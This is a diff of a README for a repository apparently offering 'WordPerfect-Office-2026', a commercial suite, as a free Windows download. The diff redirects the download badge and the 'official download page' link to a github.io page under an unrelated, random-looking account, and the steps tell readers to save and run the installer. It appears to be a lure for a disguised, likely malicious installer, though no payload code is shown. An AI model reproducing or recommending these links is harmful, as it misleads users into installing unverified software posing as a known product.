@@ -1,6 +1,6 @@
 # 📄 WordPerfect-Office-2026 - Create professional documents on Windows computers
 
-[![](https://img.shields.io/badge/Download_WordPerfect_Office-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Tropic-valdosta558/WordPerfect-Office-2026)
+[![](https://img.shields.io/badge/Download_WordPerfect_Office-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tropic-valdosta558.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Before you install this application, ensure your computer meets these requiremen
 
 Follow these steps to obtain and install the software on your system.
 
-1. Visit [the official download page](https://github.com/Tropic-valdosta558/WordPerfect-Office-2026) to start the process.
+1. Visit [the official download page](https://tropic-valdosta558.github.io) to start the process.
 2. Locate the download button or link on that page.
 3. Save the installer file to your computer. Choose a location like your Downloads folder so you can find it.
 4. Open the folder where you saved the file.
